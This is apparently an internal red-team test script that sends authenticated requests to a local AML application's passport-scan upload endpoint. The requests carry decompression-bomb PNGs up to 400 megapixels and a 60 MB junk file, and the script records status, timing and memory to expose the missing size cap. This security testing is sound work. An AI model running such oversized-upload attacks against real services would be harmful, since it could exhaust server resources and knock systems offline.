"""Red-team 2026-10-20: authenticated POST /api/v1/customers/scan-passport with oversized / decompression-bomb images (no size cap on the upload read).
LOCAL ONLY (needs fixtures/ from PR #412 make_seed)."""
import io, json, os, resource, shutil, sys, tempfile, time
from pathlib import Path
ROOT = Path(__file__).resolve().parent.parent; sys.path.insert(0, str(ROOT))
ids = json.loads((ROOT/"fixtures"/"seed_ids.json").read_text()); B = ids["B"]
db = Path(tempfile.mkdtemp())/"s.db"; os.environ["AMLKIT_DB"] = str(db); shutil.copy(ROOT/"fixtures"/"seed.db", db)
import logging, warnings; logging.disable(logging.CRITICAL); warnings.simplefilter("ignore")
from PIL import Image
from fastapi.testclient import TestClient
from amlkit import auth
from amlkit.api.app import app, limiter
from amlkit.db import connect, _reset_init_cache
_reset_init_cache(); limiter.reset()
c = connect(db); t = auth.create_session(c, B["mlro_id"], B["org_id"], mfa_verified=True); c.close()
cl = TestClient(app, raise_server_exceptions=False); H = {"Authorization": f"Bearer {t}"}
def png(w, h):
    b = io.BytesIO(); Image.new("L", (w, h), 255).save(b, "PNG", compress_level=9); return b.getvalue()
def post(data, name="p.png", ct="image/png"):
    t0 = time.time(); r = cl.post("/api/v1/customers/scan-passport", files={"passport_file": (name, data, ct)}, headers=H)
    return r.status_code, round(time.time()-t0, 1), r.text[:110].replace("\n", " "), f"maxrss={resource.getrusage(resource.RUSAGE_SELF).ru_maxrss//1024}MB"
print("baseline maxrss", resource.getrusage(resource.RUSAGE_SELF).ru_maxrss//1024, "MB")
for label, (w, h) in [("normal 800x600", (800, 600)), ("9000x9000 (81 MP)", (9000, 9000)), ("12000x12000 (144 MP, > warn, < error)", (12000, 12000)), ("20000x20000 (400 MP, > error limit)", (20000, 20000))]:
    d = png(w, h); print(f" {label}: file {len(d)//1024} KB ->", post(d))
big = b"\x89PNG\r\n\x1a\n" + os.urandom(60*1024*1024); print(" 60 MB junk with PNG magic ->", post(big))
